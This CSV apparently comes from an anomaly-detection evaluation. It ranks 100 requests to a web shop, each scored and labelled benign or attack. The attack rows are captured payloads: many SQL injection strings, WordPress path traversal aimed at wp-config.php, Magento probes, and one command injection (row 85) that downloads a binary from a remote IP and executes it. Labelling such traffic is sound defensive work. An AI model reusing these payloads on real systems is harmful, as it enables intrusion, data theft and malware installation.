rank,http_method,url_path_raw,url_query,score,regex_marked,class,kind
1,GET,/index.action,,0.966418555548679,False,attack,exploit probe
2,HEAD,/browse/cooktop/%D8%A7%D8%AC%D8%A7%D9%82-%DA%AF%D8%A7%D8%B2-%D8%B5%D9%81%D8%AD%D9%87-%D8%A7%D9%8A,,0.6548785399646135,False,benign,
3,HEAD,/browse/hood/%D9%87%D9%88%D8%AF,,0.648765865110624,False,benign,
4,GET,/product/28108/56824/%D9%87%D9%88%D8%AF-%D8%B4%D9%88%D9%85%D9%8A%D9%86%D9%87-%D8%A7%D9%8A-%D8%A7%D8%AE%D9%88%D8%A7%D9%86-%D9%85%D8%AF%D9%84-H-28-4S,,0.5036125273372261,False,benign,
5,HEAD,/product/28108/56824/%D9%87%D9%88%D8%AF-%D8%B4%D9%88%D9%85%D9%8A%D9%86%D9%87-%D8%A7%D9%8A-%D8%A7%D8%AE%D9%88%D8%A7%D9%86-%D9%85%D8%AF%D9%84-H-28-4S,,0.5036125273372261,False,benign,
6,GET,/product/28077/56756/%D9%87%D9%88%D8%AF-%D8%B4%D9%88%D9%85%D9%8A%D9%86%D9%87-%D8%A7%D9%8A-%D8%A7%D8%AE%D9%88%D8%A7%D9%86-%D9%85%D8%AF%D9%84-H-11,,0.4926444707520726,False,benign,
7,HEAD,/product/28077/56756/%D9%87%D9%88%D8%AF-%D8%B4%D9%88%D9%85%D9%8A%D9%86%D9%87-%D8%A7%D9%8A-%D8%A7%D8%AE%D9%88%D8%A7%D9%86-%D9%85%D8%AF%D9%84-H-11,,0.4926444707520726,False,benign,
8,GET,/blog/accessories/jewelry/men-jewelry/men-ring/%d9%81%db%8c%d8%b1%d9%88%d8%b2%d9%87%d8%9b-%d9%88%db%8c%da%98%da%af%db%8c%e2%80%8c%d9%87%d8%a7%d8%8c-%d8%aa%d8%b4%d8%ae%db%8c%d8%b5-%d8%a7%d8%b5%d9%84-%d9%88-%d8%a8%d8%af%d9%84-%d9%88-%d8%b1%d9%88/,,0.3683999008288361,False,benign,
9,GET,http://www.boxun.com/,,0.35072515760743617,False,attack,open-proxy request
10,GET,/wp-content/plugins/google-mp3-audio-player/direct_download.php,file=../../../wp-config.php,0.34699152919943105,True,attack,path traversal or file inclusion (marker)
11,GET,/wp-content/plugins/recent-backups/download-file.php,file_link=../../../wp-config.php,0.3253758476768689,True,attack,path traversal or file inclusion (marker)
12,GET,/image/29000,name=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281836%3D1836%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29,0.32268050175245,False,attack,SQL injection (no marker)
13,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20AND%201152%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281152%3D1152%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%27SIfl%27%3D%27SIfl,0.30835733040367813,True,attack,SQL injection (marker)
14,GET,http://www.minghui.org/,,0.3076905793256369,False,attack,open-proxy request
15,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%29%20AND%201152%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281152%3D1152%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%282459%3D2459,0.30759612123127106,False,attack,SQL injection (no marker)
16,GET,http://www.epochtimes.com/,,0.3059490839132908,False,attack,open-proxy request
17,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%29%20AND%203953%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283953%3D3953%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27oPBM%27%3D%27oPBM,0.3034328636281938,True,attack,SQL injection (marker)
18,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20AND%203953%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283953%3D3953%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27Gqhc%27%3D%27Gqhc,0.3024131158662316,True,attack,SQL injection (marker)
19,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%20AND%201152%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281152%3D1152%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--%20ItvT,0.3013397825314828,False,attack,SQL injection (no marker)
20,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%20AND%201152%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281152%3D1152%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29,0.2983003964958344,False,attack,SQL injection (no marker)
21,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%20AND%203953%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283953%3D3953%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,0.2942681130321383,False,attack,SQL injection (no marker)
22,GET,/image/29000,name=%28SELECT%20%28CASE%20WHEN%20%287221%3D5622%29%20THEN%207221%20ELSE%207221%2A%28SELECT%207221%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29,0.2915437164433872,False,attack,SQL injection (no marker)
23,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%29%20AND%202795%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282795%3D2795%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27wxdn%27%3D%27wxdn,0.2912556508925026,True,attack,SQL injection (marker)
24,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%25%27%20AND%202795%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282795%3D2795%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27,0.2909134557546144,True,attack,SQL injection (marker)
25,GET,/image/29000,name=%28SELECT%20%28CASE%20WHEN%20%286894%3D6894%29%20THEN%206894%20ELSE%206894%2A%28SELECT%206894%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29,0.29068507735853966,False,attack,SQL injection (no marker)
26,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20AND%202795%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282795%3D2795%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27FfNB%27%3D%27FfNB,0.29016993744943975,True,attack,SQL injection (marker)
27,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%29%20AND%202795%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282795%3D2795%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%289282%3D9282,0.2897034740880117,False,attack,SQL injection (no marker)
28,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%20AND%202795%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282795%3D2795%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20eCVR,0.2827419538299236,False,attack,SQL injection (no marker)
29,GET,/wp-admin/admin-ajax.php,action=revslider_show_image&img=../wp-config.php,0.28145078262162576,True,attack,path traversal or file inclusion (marker)
30,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%29%20AND%20%28SELECT%202919%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a767071%2C%28SELECT%20%28ELT%282919%3D2919%2C1%29%29%29%2C0x716b766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27EfMv%27%3D%27EfMv,0.2803513314766626,True,attack,SQL injection (marker)
31,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%25%27%20AND%20%28SELECT%202919%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a767071%2C%28SELECT%20%28ELT%282919%3D2919%2C1%29%29%29%2C0x716b766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27,0.280107407289312,True,attack,SQL injection (marker)
32,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20AND%20%28SELECT%202919%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a767071%2C%28SELECT%20%28ELT%282919%3D2919%2C1%29%29%29%2C0x716b766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27xLgD%27%3D%27xLgD,0.2793609768141312,True,attack,SQL injection (marker)
33,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%29%20AND%20%28SELECT%202919%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a767071%2C%28SELECT%20%28ELT%282919%3D2919%2C1%29%29%29%2C0x716b766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%282489%3D2489,0.27837330293273294,False,attack,SQL injection (no marker)
34,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%20AND%20%28SELECT%202919%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a767071%2C%28SELECT%20%28ELT%282919%3D2919%2C1%29%29%29%2C0x716b766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20ZmCq,0.26924588204909433,False,attack,SQL injection (no marker)
35,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%20AND%20%28SELECT%202919%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a767071%2C%28SELECT%20%28ELT%282919%3D2919%2C1%29%29%29%2C0x716b766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29,0.2663865050496157,False,attack,SQL injection (no marker)
36,GET,/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php,url=../../../../wp-config.php,0.2595889932152327,True,attack,path traversal or file inclusion (marker)
37,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20iotp,0.25506108847645403,True,attack,SQL injection (marker)
38,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20oqxN,0.25348147069634597,True,attack,SQL injection (marker)
39,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20WqNe,0.2516778470491637,True,attack,SQL injection (marker)
40,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20Wnun,0.2470696668782051,True,attack,SQL injection (marker)
41,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20SAnf,0.24297560973641594,True,attack,SQL injection (marker)
42,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20UjCN,0.23879601530669542,True,attack,SQL injection (marker)
43,GET,/image/29000,name=%28SELECT%20CONCAT%280x717a767071%2C%28SELECT%20%28ELT%286359%3D6359%2C1%29%29%29%2C0x716b766b71%29%29,0.23636313948391302,False,attack,SQL injection (no marker)
44,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20dVbh,0.22641124947713442,True,attack,SQL injection (marker)
45,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20oIMw,0.21475720456503025,True,attack,SQL injection (marker)
46,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20ayJC,0.20649715141252828,True,attack,SQL injection (marker)
47,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20sqxw,0.19705905406353533,True,attack,SQL injection (marker)
48,GET,/order/track/9711060134,,0.19319646995659065,False,benign,
49,GET,/order/track/9711040905,,0.1926027753698514,False,benign,
50,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20VUtD,0.1847544786806825,True,attack,SQL injection (marker)
51,GET,/login.html,,0.18223190789428542,False,benign,
52,GET,/customer/activate/131270,code=OToxMzo0OSBBTV9hY3RpdmF0ZV8xMzEyNzA%3D,0.1812357502569475,False,benign,
53,GET,/image/24183,name=588f01.jpg&wh=200x200,0.17402441395715085,False,benign,
54,GET,/go/CY7J,,0.1709129135431475,False,benign,
55,GET,/go/CY2G,,0.1709129135431475,False,benign,
56,GET,/go/CY5Z,,0.1709129135431475,False,benign,
57,GET,/go/CY6O,,0.1709129135431475,False,benign,
58,GET,/go/CY8G,,0.1709129135431475,False,benign,
59,GET,/go/CY2T,,0.1709129135431475,False,benign,
60,GET,/go/CY4P,,0.1709129135431475,False,benign,
61,GET,/go/CYUF,,0.1709129135431475,False,benign,
62,GET,/go/CY3H,,0.1709129135431475,False,benign,
63,GET,/go/CY1W,,0.1709129135431475,False,benign,
64,GET,/order/completionAndRemainingPayment/188112,,0.16764746423440627,False,benign,
65,GET,/order/completionAndRemainingPayment/188136,,0.1659208651411268,False,benign,
66,GET,/order/completionAndRemainingPayment/188053,,0.16558076398453672,False,benign,
67,GET,"/filter/b136,b152,b261,b32,b58,b664,b873,p1422",,0.16224003858716396,False,benign,
68,GET,/order/completionAndRemainingPayment/187992,,0.16042605450949857,False,benign,
69,GET,/order/completionAndRemainingPayment/187949,,0.1600099941253763,False,benign,
70,GET,/order/completionAndRemainingPayment/187988,,0.1594500152368953,False,benign,
71,GET,/order/completionAndRemainingPayment/187773,,0.15936226665154615,False,benign,
72,GET,/order/completionAndRemainingPayment/187762,,0.15935612976479827,False,benign,
73,GET,/order/completionAndRemainingPayment/187905,,0.15934971886920754,False,benign,
74,GET,/test/js/mage/cookies.js,,0.14859602497442026,False,attack,Magento file probe
75,GET,/product/33380/%DA%AF%D9%88%D8%B4%D8%AA-%DA%A9%D9%88%D8%A8-%D8%A8%D8%B1%D9%82%DB%8C-%D9%85%DB%8C%D9%84%D9%87-%D8%A7%DB%8C-%D8%B3%D8%A8%DA%A9-%DA%A9%D9%86%D9%88%D9%88%D8%AF-%D9%85%D8%AF%D9%84-HDP302WH,,0.14781639115812942,False,benign,
76,GET,/go/CYZJ,,0.14247754780327102,False,benign,
77,GET,/go/CY0I,,0.14247754780327102,False,benign,
78,GET,/order/completionAndRemainingPayment/187934,,0.1342715180978515,False,benign,
79,GET,/shops/js/mage/cookies.js,,0.13386934025760241,False,attack,Magento file probe
80,GET,/demo/js/mage/cookies.js,,0.13359432365908272,False,attack,Magento file probe
81,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%29%20AND%207986%3D7986%20AND%20%28%27aYpR%27%3D%27aYpR,0.13289229997517835,True,attack,SQL injection (marker)
82,GET,/order/completionAndRemainingPayment/187871,,0.1326446965666848,False,benign,
83,GET,/loja/js/mage/cookies.js,,0.13204426519379198,False,attack,Magento file probe
84,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%29%20AND%208996%3D1801%20AND%20%285810%3D5810,0.13121725335412454,False,attack,SQL injection (no marker)
85,GET,/login.cgi,cli=aa%20aa%27;wget%20http://68.183.170.67/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$,0.12811704240614813,True,attack,command injection (marker)
86,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%29%20AND%203947%3D3879%20AND%20%28%27ONyF%27%3D%27ONyF,0.1278498671235881,True,attack,SQL injection (marker)
87,GET,/market/js/mage/cookies.js,,0.12692691827472158,False,attack,Magento file probe
88,GET,/shop/js/mage/cookies.js,,0.12685977711055405,False,attack,Magento file probe
89,GET,/dev/js/mage/cookies.js,,0.12675115660583322,False,attack,Magento file probe
90,GET,/magento/js/mage/cookies.js,,0.12440222949309457,False,attack,Magento file probe
91,GET,/stock/js/mage/cookies.js,,0.1233760918053959,False,attack,Magento file probe
92,GET,/cgi-bin/nobody/Machine.cgi,action=get_capability,0.11958493055612118,False,attack,exploit probe
93,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%29%3BSELECT%20SLEEP%285%29%23,0.11620215290752224,False,attack,SQL injection (no marker)
94,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%3BSELECT%20IF%28%2827%3D27%29%2CSLEEP%285%29%2C9862%29%23,0.115460751610354,True,attack,SQL injection (marker)
95,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%20ORDER%20BY%201--%20pqre,0.11510146154120145,True,attack,SQL injection (marker)
96,GET,/image/29000,name=6aba3c.jpg%26amp%3Bwh%3D200x200%27%3BSELECT%20SLEEP%285%29%23,0.11446166643600733,True,attack,SQL injection (marker)
97,GET,/current_config/passwd,,0.112725037793444,True,attack,path traversal or file inclusion (marker)
98,GET,/customer/activate/131206,code=MTo1ODoxNSBQTV9hY3RpdmF0ZV8xMzEyMDY%3D,0.10871242538487187,False,benign,
99,GET,/browse/home-theater-system/%25D8%25B3%25DB%258C%25D9%2586%25D9%2585%25D8%25A7-%25D8%25AE%25D8%25A7%25D9%2586%25DA%25AF%25DB%258C,,0.10621169215517542,False,benign,
100,GET,/mage/js/mage/cookies.js,,0.10335954822161726,False,attack,Magento file probe
